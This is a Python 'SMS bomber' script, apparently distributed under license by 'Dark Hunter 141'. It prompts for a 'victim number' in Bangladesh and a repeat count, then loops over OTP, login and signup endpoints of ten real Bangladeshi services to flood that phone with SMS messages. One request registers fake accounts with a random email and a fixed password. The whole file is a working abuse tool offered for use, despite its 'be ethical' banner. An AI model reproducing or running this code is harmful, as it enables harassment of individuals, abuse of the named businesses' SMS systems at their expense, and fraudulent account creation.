import os
import sys
import time
import requests
import random
import string
from requests.structures import CaseInsensitiveDict

# Define function to simulate typing
def Wolf(xak):
    for x in xak:
        sys.stdout.write(x)
        sys.stdout.flush()




def checekLicence(licencekey):
    response = requests.get('https://pastebin.com/M4tzqzuT')
    return licencekey in response.text

def Wolf(xak, delay=0.001):  # default delay set to 0.1 seconds
    for x in xak:
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(delay)


# ASCII letters for generating random strings
letters = string.ascii_lowercase
pwd_length = 12
pwd = ''.join(random.choice(letters) for i in range(pwd_length))

# Colors for terminal output
g = "\033[1;32m"  # Green
r = "\033[1;31m"  # Red
w = "\033[1;37m"  # White
c = "\033[1;36m"  # Cyan
y = "\033[1;33m"  # Yellow
try:
    
    os.system('clear')
except:
    pass





info = f'''{y}  Please contact with admin  to get license key 
            Telegram Channel : https://t.me/darkhunter141
            Facebook Page    : https://www.facebook.com/darkhunter141
            YouTube          : Pythonic Shariful
'''




logo=  f'''{g}

██████   ██████   ██████  ███    ███ ██████  ███████ ██████  
██   ██ ██    ██ ██    ██ ████  ████ ██   ██ ██      ██   ██ 
██████  ██    ██ ██    ██ ██ ████ ██ ██████  █████   ██████  
██   ██ ██    ██ ██    ██ ██  ██  ██ ██   ██ ██      ██   ██ 
██████   ██████   ██████  ██      ██ ██████  ███████ ██   ██                                   
            DEVELOPED BY : DARK HUNTER 141
            YOUTUBE      : PYTHONIC SHARIFUL
'''
Wolf(logo)

# Check internet connection
print(w + "[~] Connecting To The Internet")
try:
    request = requests.get("https://www.google.com/", timeout=2)
    print("\n\033[1;37m[\033[1;32m#\033[1;37m]" + "\033[1;32m Connected ")
except (requests.ConnectionError, requests.Timeout) as exception:
    print("\n\033[1;37m[\033[1;32m#\033[1;37m] \033[1;31m😢 Your Internet Connection Is Poor !")
    sys.exit()
try:
    with open('keys.txt', 'r', encoding='utf-8') as file:
        licencekey = file.read().strip()
except FileNotFoundError:
    print(f"{r}License key file not found😢.")
    Wolf(info,0.01)
    sys.exit()

# Check the license key validity and print the result in color
if checekLicence(licencekey):
    print(f"{g}License key verified{w}")
else:
    print(f"{r}Wrong License Key{w}")
    Wolf(info,0.01)
    sys.exit()

number = input(f"{c}\n[ VICTIM NUMBER ] :{w} +880")
amo = int(input(c + "\n[ AMOUNT ] : " + w))
Wolf(f"\n\n\t\t   {w}<{r}/{w}> {g}BE ETHICAL MATE ;) {w}<{r}/{w}>\n\n")
try:
    os.system('clear')
except:
    pass

# List of APIs to send SMS
sms_apis = [
    {"url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0" + number, "method": "GET"},
    {"url": "https://www.bioscopelive.com/en/login/send-otp?phone=" + number + "&operator=bd-otp", "method": "GET"},
    {"url": "https://fundesh.com.bd/api/auth/generateOTP?service_key=", "method": "POST", "data": '{"msisdn":"'+number+'"}', "headers": {"Content-Type": "application/json"}},
    {"url": "https://api.redx.com.bd/v1/user/signup", "method": "POST", "data": '{"name":"961096106","phoneNumber":"'+number+'","service":"redx"}', "headers": {"Content-Type": "application/json"}},
    {"url": "https://api.bongo-solutions.com/auth/api/login/send-otp", "method": "POST", "data": '{"operator":"all","msisdn":"880'+number+'"}', "headers": {"Content-Type": "application/json"}},
    {"url": "https://www.rokomari.com/resend-verification-code?email_phone=880"+number, "method": "GET"},
    {"url": "https://www.pizzahutbd.com/customer/sign-in/mobile", "method": "POST", "data": "_token=t7I6C5hDF7XgnfD5rNkeEloIbGlS71lpa6tHZMPh&phone_number=0"+number, "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"url": "https://admission.ndub.edu.bd/api/users/register-step-1/", "method": "POST", "data": '{"name":"asad","email":"'+pwd+'@gmail.com","phone":"0'+number+'","password":"1q2w3e4r","confirmPassword":"1q2w3e4r"}', "headers": {"Content-Type": "application/json"}},
    {"url": "https://developer.quizgiri.xyz/api/v2.0/send-otp", "method": "POST", "data": '{"phone":"0'+number+'","country_code":"+880","fcm_token":null}', "headers": {"Content-Type": "application/json"}},
    {"url": "https://api.shikho.com/auth/v2/send/sms", "method": "POST", "data": '{"phone":"0'+number+'","email":null,"auth_type":"login"}', "headers": {"Content-Type": "application/json"}}
    
]


for i in range(amo):
    for api in sms_apis:
        try:
            if api["method"] == "GET":
                response = requests.get(api["url"])
            elif api["method"] == "POST":
                response = requests.post(api["url"], data=api["data"], headers=api.get("headers", {}))
            
            if response.status_code == 200:
                print(g + f"[{i+1}] SMS sent via {api['url']}")
            else:
                pass
        except Exception as e:
            print(r + f"[{i+1}] Error occurred: {str(e)}")

print(c + f"\nCompleted sending {amo} SMS.")
